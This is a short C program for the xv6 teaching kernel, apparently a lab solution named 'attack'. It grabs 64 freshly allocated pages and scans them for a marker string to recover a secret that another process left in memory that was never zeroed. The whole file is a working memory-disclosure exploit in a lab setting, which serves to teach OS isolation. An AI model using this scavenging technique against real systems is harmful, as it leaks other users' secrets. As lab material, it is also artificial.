#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

#define PAGES 64
#define PAGE_SIZE 4096
#define TOTAL (PAGES * PAGE_SIZE)
#define MSG "Here it is: "

int
main(int argc, char *argv[])
{
    char *memory = sbrk(TOTAL);

    if (memory == (char *)-1) {
        fprintf(2, "attack: sbrk failed\n");
        exit(1);
    }

    int marker_len = strlen(MSG);

    for (int i = 0; i + marker_len < TOTAL; i++) {

        if (memcmp(memory + i, MSG, marker_len) != 0)
            continue;

        int start = i + marker_len;
        int end = start;

        while (end < TOTAL) {
            char c = memory[end];

            if ((c >= '0' && c <= '9') ||
                (c >= 'A' && c <= 'Z') ||
                (c >= 'a' && c <= 'z')) {
                end++;
            } else {
                break;
            }
        }

        if (end > start && end < TOTAL &&
            memory[end] == '\0') {

            if (write(1, memory + start, end - start)
                != end - start)
                exit(1);

            if (write(1, "\n", 1) != 1)
                exit(1);

            exit(0);
        }
    }

    exit(1);
}